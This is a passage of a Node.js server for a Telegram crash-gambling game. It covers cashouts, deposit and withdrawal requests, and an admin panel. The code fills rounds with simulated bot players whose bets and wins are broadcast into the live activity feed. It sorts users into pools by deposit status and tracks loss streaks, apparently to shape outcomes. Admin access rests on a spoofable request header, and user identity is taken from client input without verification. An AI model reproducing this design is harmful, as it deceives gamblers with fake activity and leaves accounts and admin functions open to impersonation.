      if (user.balance > (user.peakBalance || 0)) {
        User.findOneAndUpdate({ telegramId:userId }, { peakBalance:user.balance }).catch(()=>{});
      }
      // Update segment pool assignment if they just crossed threshold
      await updateUserPool(userId, user.balance, user.totalDeposited);

      // ★ Reset consecutive loss streak on win
      const prev = userInfoCache.get(userId) || {};
      userInfoCache.set(userId, { ...prev, balance:user.balance, totalDeposited:user.totalDeposited, consecutiveLosses:0 });

      Bet.create({ userId, username:bet.username, amount:bet.amount, gameId:G.gameId, cashoutMultiplier:multiplier, profit, status:'won', cashedAt:new Date(), pool:G.poolName }).catch(()=>{});
      io.emit('balanceUpdate', { userId, balance:user.balance });
    }
    io.to(G.poolName).emit('betResult', { success:true, type:'cashout', userId, gameId:G.gameId, multiplier, profit, betAmount:bet.amount, totalReturn });
    io.to(G.poolName).emit('newHistory', { username:bet.username, start:1.0, stop:multiplier, profit, isBot:false, status:'won' });
    io.to(G.poolName).emit('activeBets', { bets:activeBetsSnapshot(G), pool:G.poolName });
    return { success:true, multiplier, profit, totalReturn, newBalance:user?.balance };
  } catch (e) { console.error('cashOut:', e); return { success:false, message:'Server error' }; }
}

// ═══════════════════════════════════════════════════════════════════════════
//  USER POOL ASSIGNMENT
//  Called after every auth, balance change, deposit confirm
// ═══════════════════════════════════════════════════════════════════════════
async function updateUserPool(userId, balance, totalDeposited) {
  if (totalDeposited > 0) {
    userPoolMap.set(userId, 'paid');
  } else {
    userPoolMap.set(userId, 'free');
  }
  userInfoCache.set(userId, { balance, totalDeposited });

  const seg = getPlayerSegment(balance, totalDeposited);
  console.log(`👤 ${userId} → pool=${userPoolMap.get(userId)} seg=${seg} bal=${balance} dep=${totalDeposited}`);
}

// ═══════════════════════════════════════════════════════════════════════════
//  BOT SYSTEM
// ═══════════════════════════════════════════════════════════════════════════
function placeBotBets(G, maxBots = TOTAL_PLAYERS) {
  if (G.phase !== 'countdown') return;
  let realCount = 0;
  for (const b of G.bets.values()) if (!b.isBot) realCount++;
  const need = Math.max(0, maxBots - realCount);
  if (!need) return;
  const fresh  = BOT_ARRAY.filter(b => b.lastRound !== roundCounter-1);
  const pool   = fresh.length >= need ? fresh : BOT_ARRAY;
  const bots   = shuffleSlice(pool, need);
  bots.forEach(bot => {
    if (bot.balance < 200) bot.balance = 5000;
    const max = Math.min(1500, bot.balance);
    const amt = 200 + Math.floor(rand()*(max-200));
    bot.balance -= amt; bot.lastRound = roundCounter;
    G.bets.set(bot.id, { userId:bot.id, username:bot.username, amount:amt, isBot:true, strategy:bot.strategy, gameId:G.gameId, placedAt:Date.now(), cashedAt:null, cashoutMultiplier:null, profit:null });
    G.totalBetsAmount += amt;
  });
  io.to(G.poolName).emit('activeBets', { bets:activeBetsSnapshot(G), pool:G.poolName });
}

function processBotCashouts(G) {
  if (G.crashPoint <= 1.00) return;
  const low = G.crashPoint <= 1.5;
  for (const [uid, bet] of G.bets.entries()) {
    if (!bet.isBot || bet.cashedAt) continue;
    const m = G.currentMultiplier;
    let cash = false;
    switch (bet.strategy) {
      case 'early':  cash=low?m>1.05&&m<1.25&&rand()<0.55:m>1.20&&m<2.00&&rand()<0.22; break;
      case 'medium': cash=low?m>1.10&&m<1.35&&rand()<0.45:m>2.00&&m<5.00&&rand()<0.16; break;
      case 'late':   cash=low?m>1.15&&rand()<0.40:m>5.00&&m<10.0&&rand()<0.12; break;
      case 'random': cash=rand()<(low?0.18:0.07); break;
    }
    if (!cash) continue;
    const p = r2(bet.amount*(m-1));
    bet.cashedAt=Date.now(); bet.cashoutMultiplier=m; bet.profit=p;
    const bo = BOT_POOL.get(uid); if (bo) bo.balance += bet.amount+p;
    io.to(G.poolName).emit('newHistory', { username:bet.username, start:1.0, stop:m, profit:p, isBot:true, status:'won' });
    io.to(G.poolName).emit('activeBets', { bets:activeBetsSnapshot(G), pool:G.poolName });
  }
}

async function processBetLoss(userId, bet, G) {
  if (bet.isBot) { const b=BOT_POOL.get(userId); if(b&&b.balance<1000) b.balance+=3000; }
  else {
    // ★ Increment consecutive loss counter
    const prev = userInfoCache.get(userId) || {};
    userInfoCache.set(userId, {
      ...prev,
      consecutiveLosses: (prev.consecutiveLosses || 0) + 1,
      lastBetAmt: bet.amount,
    });
  }
  io.to(G.poolName).emit('newHistory', { username:bet.username, start:1.0, stop:G.crashPoint, profit:-bet.amount, isBot:bet.isBot, status:'lost' });
}

// ═══════════════════════════════════════════════════════════════════════════
//  SOCKET.IO
// ═══════════════════════════════════════════════════════════════════════════
io.on('connection', async (socket) => {
  const userId = socket.handshake.query.userId || null;
  socket.userId = userId;

  // Join correct pool room
  let poolName = 'free';
  if (userId) {
    const cached = userInfoCache.get(userId);
    if (cached) {
      poolName = cached.totalDeposited > 0 ? 'paid' : 'free';
    } else {
      // Load from DB
      try {
        const u = await User.findOne({ telegramId: userId }).lean();
        if (u) {
          poolName = u.totalDeposited > 0 ? 'paid' : 'free';
          await updateUserPool(userId, u.balance, u.totalDeposited);
        }
      } catch {}
    }
  }
  userPoolMap.set(userId, poolName);
  socket.join(poolName);
  socket.currentPool = poolName;

  const G = poolName === 'paid' ? G_PAID : G_FREE;
  socket.emit('gameState', { phase:G.phase, gameId:G.gameId, multiplier:G.currentMultiplier, history:G.history.slice(0,10), ts:Date.now(), pool:poolName });
  socket.emit('activeBets', { bets:activeBetsSnapshot(G), pool:poolName });
  if (G.phase==='running') socket.emit('multiplier', { multiplier:G.currentMultiplier, phase:'running', ts:Date.now(), pool:poolName });

  socket.on('placeBet', async (data, cb) => {
    if (typeof cb !== 'function') return;
    if (!data?.userId || !data?.username || !data?.amount) return cb({ success:false, message:'Invalid' });
    cb(await placeBet(String(data.userId), String(data.username), Number(data.amount)));
  });

  socket.on('cashOut', async (data, cb) => {
    if (typeof cb !== 'function') return;
    if (!data?.userId) return cb({ success:false, message:'Invalid' });
    cb(await cashOut(String(data.userId), data.multiplier, data.gameId));
  });

  socket.on('setAutoCashout', d => {
    if (d?.userId && d?.target && d.target >= 1.10) {
      autoCashoutTargets.set(String(d.userId), parseFloat(d.target));
    }
  });

  socket.on('authenticate', async d => {
    if (!d?.userId) return;
    socket.userId = String(d.userId);
    // Re-check pool and re-join if needed
    const cached = userInfoCache.get(socket.userId);
    if (cached) {
      const newPool = cached.totalDeposited > 0 ? 'paid' : 'free';
      if (newPool !== socket.currentPool) {
        socket.leave(socket.currentPool);
        socket.join(newPool);
        socket.currentPool = newPool;
        userPoolMap.set(socket.userId, newPool);
        const NG = newPool === 'paid' ? G_PAID : G_FREE;
        socket.emit('gameState', { phase:NG.phase, gameId:NG.gameId, multiplier:NG.currentMultiplier, history:NG.history.slice(0,10), ts:Date.now(), pool:newPool });
      }
    }
  });

  socket.on('disconnect', r => console.log(`🔴 [${socket.id}] ${r}`));
  socket.on('error', e => console.error('Sock err:', e.message));
});

// ═══════════════════════════════════════════════════════════════════════════
//  API ROUTES
// ═══════════════════════════════════════════════════════════════════════════
app.post('/api/auth', async (req, res) => {
  try {
    const { id, username, first_name, last_name } = req.body;
    if (!id) return res.status(400).json({ success:false, message:'Missing id' });
    const tid = String(id);
    let user  = await User.findOne({ telegramId:tid });
    if (!user) {
      user = await User.create({ telegramId:tid, username, firstName:first_name, lastName:last_name, balance:1000 });
    } else {
      if (user.isBanned) return res.json({ success:false, banned:true, message:'Banned' });
      user.lastActive = new Date(); await user.save();
    }
    // Set pool assignment on auth
    await updateUserPool(tid, user.balance, user.totalDeposited);
    const seg = getPlayerSegment(user.balance, user.totalDeposited, 0);
    const pool = user.totalDeposited > 0 ? 'paid' : 'free';
    res.json({ success:true, user:{ id:user.telegramId, username:user.username, balance:user.balance, totalDeposited:user.totalDeposited, totalWithdrawn:user.totalWithdrawn, pool, segment:seg } });
  } catch { res.status(500).json({ success:false, message:'Server error' }); }
});

app.post('/api/deposit', async (req, res) => {
  try {
    const { userId, username, name, phone, amount } = req.body;
    if (!userId||!name||!phone||!amount||Number(amount)<3000) return res.status(400).json({ success:false, message:'Invalid' });
    const tx = await Transaction.create({ userId, username, type:'deposit', amount:Number(amount), accountName:name, accountNumber:phone });
    await notifyAdmins(`💵 <b>ငွေသွင်းတောင်းဆိုချက်</b>\n👤 ${username||userId}\n💰 ${Number(amount).toLocaleString()} MMK\n📞 ${name} (${phone})\n🆔 <code>${tx._id}</code>`);
    res.json({ success:true });
  } catch { res.status(500).json({ success:false, message:'Server error' }); }
});

app.post('/api/withdraw', async (req, res) => {
  try {
    const { userId, username, name, phone, amount } = req.body;
    const amt = Number(amount);
    if (!userId||!name||!phone||!amt||amt<=0) return res.status(400).json({ success:false, message:'Invalid' });
    if (amt < MIN_WITHDRAWAL) return res.status(400).json({ success:false, message:`အနည်းဆုံး ${MIN_WITHDRAWAL.toLocaleString()} MMK` });
    const user = await User.findOneAndUpdate({ telegramId:userId, balance:{$gte:amt} }, { $inc:{balance:-amt, totalWithdrawn:amt} }, { new:true });
    if (!user) { const ex=await User.findOne({telegramId:userId}); return res.status(400).json({ success:false, message:ex?'လက်ကျန်မလုံလောက်':'User not found' }); }
    const tx = await Transaction.create({ userId, username, type:'withdraw', amount:amt, accountName:name, accountNumber:phone });
    io.emit('balanceUpdate', { userId, balance:user.balance });
    await updateUserPool(userId, user.balance, user.totalDeposited);
    await notifyAdmins(`💸 <b>ငွေထုတ်တောင်းဆိုချက်</b>\n👤 ${username||userId}\n💰 ${amt.toLocaleString()} MMK\n📞 ${name} (${phone})\n🆔 <code>${tx._id}</code>`);
    res.json({ success:true, newBalance:user.balance });
  } catch { res.status(500).json({ success:false, message:'Server error' }); }
});

app.get('/api/ref/:userId', async (req, res) => {
  try {
    const cnt = await RefLog.countDocuments({ referrerId:req.params.userId });
    const agg = await RefLog.aggregate([{$match:{referrerId:req.params.userId}},{$group:{_id:null,total:{$sum:'$bonusPaid'}}}]);
    res.json({ success:true, refCount:cnt, refEarned:agg[0]?.total||0 });
  } catch { res.status(500).json({ success:false }); }
});

// Admin guard
function adminGuard(req, res, next) {
  const id = req.headers['x-telegram-id'];
  if (!id||!ADMIN_IDS.includes(id)) return res.status(403).json({ success:false, message:'Unauthorized' });
  next();
}

app.get('/api/admin/check', (req, res) => {
  const id = req.headers['x-telegram-id'];
  res.json({ isAdmin: !!(id && ADMIN_IDS.includes(id)) });
});

app.get('/api/admin/users', adminGuard, async (req, res) => {
  try {
    const users = await User.find().sort({ createdAt:-1 }).limit(500).lean();
    // Annotate each user with live segment
    const annotated = users.map(u => ({
      ...u,
      segment: getPlayerSegment(u.balance, u.totalDeposited, 0),
      pool: u.totalDeposited > 0 ? 'paid' : 'free',
    }));
    res.json({ success:true, users:annotated, total:annotated.length });
  } catch { res.status(500).json({ success:false }); }
});

app.get('/api/admin/transactions', adminGuard, async (req, res) => {
  try { res.json({ success:true, transactions: await Transaction.find().sort({ createdAt:-1 }).limit(500).lean() }); }
  catch { res.status(500).json({ success:false }); }
});

app.post('/api/admin/user/balance', adminGuard, async (req, res) => {
  try {
    const { userId, action, amount } = req.body; const amt = Number(amount);
    if (!userId||!action||!amt) return res.status(400).json({ success:false });
    let user;
    if (action==='add') user=await User.findOneAndUpdate({telegramId:userId},{$inc:{balance:amt,totalDeposited:amt}},{new:true});
    else if (action==='deduct') { user=await User.findOneAndUpdate({telegramId:userId,balance:{$gte:amt}},{$inc:{balance:-amt,totalWithdrawn:amt}},{new:true}); if(!user) return res.status(400).json({success:false,message:'Insufficient'}); }
    else return res.status(400).json({ success:false });
    if (!user) return res.status(404).json({ success:false });
    await updateUserPool(userId, user.balance, user.totalDeposited);
    io.emit('balanceUpdate', { userId, balance:user.balance });
    try { await bot.telegram.sendMessage(userId, `💰 Admin မှ ${action==='add'?'+':'-'}${amt.toLocaleString()} MMK\nBalance: <b>${user.balance.toLocaleString()} MMK</b>`, {parse_mode:'HTML'}); } catch {}
    res.json({ success:true, balance:user.balance });
  } catch { res.status(500).json({ success:false }); }
});

app.post('/api/admin/user/ban', adminGuard, async (req, res) => {
  try {
    const { userId, ban, reason } = req.body;
    const upd = ban ? {isBanned:true,banReason:reason||'',bannedAt:new Date()} : {isBanned:false,banReason:null,bannedAt:null};
    const user = await User.findOneAndUpdate({telegramId:userId}, upd);
    if (!user) return res.status(404).json({ success:false });
    res.json({ success:true });
  } catch { res.status(500).json({ success:false }); }
});

app.post('/api/admin/transaction/process', adminGuard, async (req, res) => {
  try {
    const { transactionId, status, adminNote } = req.body;
    const tx = await Transaction.findById(transactionId);
    if (!tx)                     return res.status(404).json({ success:false });
    if (tx.status !== 'pending') return res.status(400).json({ success:false, message:'Already processed' });

    if (status==='confirmed' && tx.type==='deposit') {
      const u = await User.findOneAndUpdate({telegramId:tx.userId},{$inc:{balance:tx.amount,totalDeposited:tx.amount}},{new:true});
      if (u) {
        io.emit('balanceUpdate', { userId:tx.userId, balance:u.balance });
        // ★ Move user to PAID pool on first deposit
        await updateUserPool(tx.userId, u.balance, u.totalDeposited);
        // Re-join socket to paid room
        const sockets = await io.fetchSockets();
        for (const s of sockets) { if (s.userId===tx.userId) { s.leave('free'); s.join('paid'); s.currentPool='paid'; const NG=G_PAID; s.emit('gameState',{phase:NG.phase,gameId:NG.gameId,multiplier:NG.currentMultiplier,history:NG.history.slice(0,10),ts:Date.now(),pool:'paid'}); break; } }
        try { await bot.telegram.sendMessage(tx.userId, `✅ ငွေသွင်း <b>${tx.amount.toLocaleString()} MMK</b> အတည်ပြုပြီ!\nBalance: <b>${u.balance.toLocaleString()} MMK</b>`, {parse_mode:'HTML'}); } catch {}
      }
    }
    if (status==='rejected' && tx.type==='withdraw') {
      const u = await User.findOneAndUpdate({telegramId:tx.userId},{$inc:{balance:tx.amount,totalWithdrawn:-tx.amount}},{new:true});
      if (u) { io.emit('balanceUpdate',{userId:tx.userId,balance:u.balance}); try{await bot.telegram.sendMessage(tx.userId,`❌ ငွေထုတ် <b>${tx.amount.toLocaleString()} MMK</b> ငြင်းပယ်ခံရပါသည်`,{parse_mode:'HTML'});}catch{} }
    }

    tx.status=status; tx.adminNote=adminNote||''; tx.confirmedBy=req.headers['x-telegram-id']; tx.confirmedAt=new Date();
    await tx.save();
    res.json({ success:true });
  } catch { res.status(500).json({ success:false }); }
});

app.get('/api/admin/stats', adminGuard, async (req, res) => {
  try {
    const [totalUsers, freeUsers, paidUsers, betsAgg, txAgg, totalRefs] = await Promise.all([
      User.countDocuments(),
      User.countDocuments({ totalDeposited:0 }),
      User.countDocuments({ totalDeposited:{$gt:0} }),
      Bet.aggregate([{ $group:{ _id:null, totalBets:{$sum:'$amount'}, totalWon:{$sum:{$cond:[{$eq:['$status','won']},'$profit',0]}}, countBets:{$sum:1} } }]),
      Transaction.aggregate([{ $match:{status:'confirmed'} }, { $group:{ _id:'$type', total:{$sum:'$amount'} } }]),
      RefLog.countDocuments(),
    ]);
    const today = new Date(); today.setHours(0,0,0,0);
    const newToday = await User.countDocuments({ createdAt:{$gte:today} });
    const bets = betsAgg[0] || { totalBets:0, totalWon:0, countBets:0 };
    const dep  = txAgg.find(t=>t._id==='deposit')?.total  || 0;
    const wit  = txAgg.find(t=>t._id==='withdraw')?.total || 0;
    res.json({ success:true, totalUsers, freeUsers, paidUsers, newToday, totalRefs, houseBalance,
      freePool:{ phase:G_FREE.phase, round:roundCounter },
      paidPool:{ phase:G_PAID.phase },
      bets:{ count:bets.countBets, volume:bets.totalBets, won:bets.totalWon },
      transactions:{ deposited:dep, withdrawn:wit } });
  } catch { res.status(500).json({ success:false }); }
});

app.get('/api/admin/refs', adminGuard, async (req, res) => {
  try { res.json({ success:true, refs: await RefLog.find().sort({createdAt:-1}).limit(500).lean() }); }
  catch { res.status(500).json({ success:false }); }
});

app.post('/api/admin/ref/delete', adminGuard, async (req, res) => {
  try {
    const { refId, clawback } = req.body;
    const ref = await RefLog.findById(refId);
    if (!ref) return res.status(404).json({ success:false });
    if (clawback) await User.findOneAndUpdate({telegramId:ref.referrerId},{$inc:{balance:-ref.bonusPaid,referralCount:-1}});
    await RefLog.findByIdAndDelete(refId);
    res.json({ success:true });
  } catch { res.status(500).json({ success:false }); }
});

app.post('/api/admin/broadcast', adminGuard, async (req, res) => {
  try {
    const { message } = req.body;
    if (!message) return res.status(400).json({ success:false });
    const users = await User.find({ isBanned:false }, 'telegramId').lean();
    let sent=0, failed=0;
    for (const u of users) { try { await bot.telegram.sendMessage(u.telegramId, message, {parse_mode:'HTML'}); sent++; await sleep(50); } catch { failed++; } }
    res.json({ success:true, sent, failed });
  } catch { res.status(500).json({ success:false }); }
});

app.post('/api/admin/send-message', adminGuard, async (req, res) => {
  try {
    const { userId, message } = req.body;
    if (!userId||!message) return res.status(400).json({ success:false });
    await bot.telegram.sendMessage(userId, message, {parse_mode:'HTML'});
    res.json({ success:true });
  } catch (e) { res.status(500).json({ success:false, message:e.message }); }
});

app.get('/api/admin/house', adminGuard, async (req, res) => {
  try {
    const today = new Date(); today.setHours(0,0,0,0);
    const newToday = await User.countDocuments({ createdAt:{$gte:today} });
    const dep = await Transaction.aggregate([{$match:{type:'deposit',status:'confirmed'}},{$group:{_id:null,t:{$sum:'$amount'}}}]);
    const wit = await Transaction.aggregate([{$match:{type:'withdraw',status:'confirmed'}},{$group:{_id:null,t:{$sum:'$amount'}}}]);
    res.json({ success:true, houseBalance, round:roundCounter,
      freePool:{ phase:G_FREE.phase, activeBets:G_FREE.bets.size },
      paidPool:{ phase:G_PAID.phase, activeBets:G_PAID.bets.size },
      totalUsers: await User.countDocuments(),
      newToday,
      totalBets: await Bet.countDocuments(),
      totalDeposited: dep[0]?.t||0,
      totalWithdrawn:  wit[0]?.t||0 });
  } catch { res.status(500).json({ success:false }); }
});

app.post('/api/admin/house/balance', adminGuard, (req, res) => {
  const amt = Number(req.body.amount);
  if (!Number.isFinite(amt)||amt<0) return res.status(400).json({ success:false });
  houseBalance = amt;
  res.json({ success:true, houseBalance });
});

app.get('/health', (req, res) => res.json({ status:'ok', freePhase:G_FREE.phase, paidPhase:G_PAID.phase, round:roundCounter, db:dbReady, house:houseBalance }));

// ─── Start ─────────────────────────────────────────────────────────────────────
startGameLoop();
if (process.env.BOT_TOKEN) bot.launch().then(()=>console.log('🤖 Bot started')).catch(console.error);
const PORT = Number(process.env.PORT) || 3000;
server.listen(PORT, () => console.log(`🚀 Server on port ${PORT} | FREE + PAID pools running`));
const shutdown = sig => { bot.stop(sig); server.close(()=>mongoose.disconnect().then(()=>process.exit(0))); };
process.once('SIGINT',  () => shutdown('SIGINT'));
process.once('SIGTERM', () => shutdown('SIGTERM'));
